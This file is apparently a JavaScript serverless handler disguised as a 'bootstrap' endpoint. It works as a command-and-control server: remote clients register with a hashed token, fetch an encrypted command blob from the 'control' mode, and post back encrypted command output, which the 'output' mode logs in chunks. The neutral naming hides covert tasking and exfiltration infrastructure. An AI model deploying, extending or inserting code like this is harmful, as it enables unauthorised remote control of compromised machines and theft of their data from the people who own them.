import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '40';
const CONTROL_PAYLOAD = 'U2FsdGVkX1/6Ly7eGGowHT/4LRTSDgz9h851TTsX1juMjkL1BoEyxgNmVm886HSro+tvCWPLJOKfdgidsS//xh6uUe/FacJ4Xg4YL9p62pObkFpWN2kV5TCB9WyWySaM0sZSEgUieVOj57Amdbzqrp7OIEsgDSyjy9jGWwO4RcXCmxAMo2hyrQ3mnMaGZ5oTHXZs5PTgiaaE2vQBwzFVwQOrOCSEeBvbuaAjBu4y3HYa/gZyohwy0iZVEP6JDFwaKLmW77dlU7LKKbev5E1LG6ORcoAIZrUKcZYUIIm9aa9fVUOmMo8T/P6tfi7bkENwu51+H0dw5QNZ9I/5ZMSrcyUq1732dp3XDeE7+A7KcBaGJtpoOAKxpnsQDxN6d9Ih7DYzYnK7KO1BuYRU4rPwmAGqlmLyvda9OVN1jzUfmatS5Hi0rm9dUAJrr2/tJvNx9A6oJeC+kGMYOg2kDAXouoSVigC2InDCJixxuZuawW3QWqbfxWCnrsrDzul5LOesdT67o2CYlIBYKsm97IwiG1sAwvHzwsWc7JMWcafyqnBaEVs/z/48aFMjSPaNuB4GqqmROmMUkYYXVQwSdatNU4xEiwCv5x6tKqhzgRZH9+zA9FrOkN3WPjMsKRGgkRbfQ5X9gNov3lLCZke0oqX7kbnUqVsvrnczu4F6CP87AfMmagfZ1j++vwEVCItrUichMiMQiYSGe0Vw5eHk3GMgqwQKeKNuqCMRl5d56RgXTuvfvC4bo6ClfeHC4z5S3+ihNFQDtWyMZvYmMaUbBBIjutLAA0HZFgOmjPlQ/IVts5mABrxJvu8y6pZ+/dqzCFqjV6AcaWEMA2kt8BvhVJm7kjUFvI0ympmtFSA3naYO6827Tpg7pxm7WuBVmSGp2ZNP0pcC0OJXF8EwpIShc/aAi1iGm/WwgkC64eSxPVijGOTbFFgUt3CREQO2lEHMC6BtKvgy91uwPc/9KpshJvFUriw3DScl46WczG9n6q0jnxjzRX6pl5Lqx9PLjY3+XeajN8BIGXedLq5DXwL3UnnaptN3rhV2+zsMggVD1a/vwNHBSd+60A34QIQuMwLBoLfg2+ie1LHKhn+1ipiA+FWN3qrXbaL+GlKR69x/hlPh534e5G5Njq1NAsBdSM9D13Kkj/Yv1fTmo1GYzmBoPoiSfGJBETS3eh0jy/ThZOLVQerKDfE7G4XyvnzK/AYx8yaNPW4s3NB669caGbjupW/w1bM3I1h6vqvlmdPQ21GCncENE9HzYfUfs9Um6xbXBzWtzwtQ9vHPHsiL/iIL/y9n6trhxaQMcuB9epstiqITZLB67Ho3Iya7kJkhixvrmTxxi95CmckF/5SjjikT6oBYkxVbXwW44Tla9bUPod6hepBhxcDxPYPnKNPQVgFBghiyDatizjPdqk5rigiD3gjZWg+x+7DakxZQ6zzKNUWZz9rwfzljSa1CHTED8w1zti299suLbAkLkaOx5PsdhcI+cWXCVYdhQguu0N8UJALpYbDT/2q77qzVQEkRbv9Bd+uGyip3u6LEVQcHbMAlTF2iKqBE5SoETO2hxDb3xyMqZi3VjT735hW22a/lytZsTCL2VAqWZ1LKj4B5T0u9ys95Ew==';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}
function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}
export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
